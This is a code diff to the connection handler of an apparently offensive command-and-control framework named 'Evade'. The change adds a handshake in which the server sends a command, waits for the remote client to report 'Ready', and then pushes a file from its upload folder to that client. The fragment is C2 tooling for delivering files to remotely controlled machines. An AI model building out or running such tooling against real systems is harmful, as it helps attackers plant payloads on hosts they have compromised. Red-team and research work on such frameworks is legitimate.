@@ -65,17 +65,26 @@ def handle_conn(connection, address, thread_index):
                     upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\upload'
                     file_path = os.path.join(upload_dir, filename)
                     if os.path.exists(file_path):
-                    #if os.path.exists(file_path) and os.path.isfile(filename) and os.path.getsize(filename) > 0:
                         # Send the command to the client
                         cmd = CMD_INPUT[thread_index]
                         connection.send(cmd.encode())
                         # Wait for acknowledgment from the client
                         response = connection.recv(2048).decode()
-                        if response.startswith("File"):
-                            CMD_OUTPUT[thread_index] = response
-                            CMD_INPUT[thread_index] = ''
+                        if response.startswith("Ready"):
+                            with open(file_path, 'rb') as f:
+                                contents = f.read()
+                            # Send the file contents
+                            connection.send(contents) 
+                            # Receive acknowledgment from the client
+                            response = connection.recv(2048).decode()
+                            if response.startswith("File Upload Successful"):
+                                CMD_OUTPUT[thread_index] = response
+                                CMD_INPUT[thread_index] = ''
+                            else:
+                                CMD_OUTPUT[thread_index] = "Error: Invalid response from client."
+                                CMD_INPUT[thread_index] = ''
                         else:
-                            CMD_OUTPUT[thread_index] = "Error: Invalid response from client."
+                            CMD_OUTPUT[thread_index] = "Error: Client not ready to receive file."
                             CMD_INPUT[thread_index] = ''
                     else:
                         CMD_OUTPUT[thread_index] = "Error: File not found on server side."
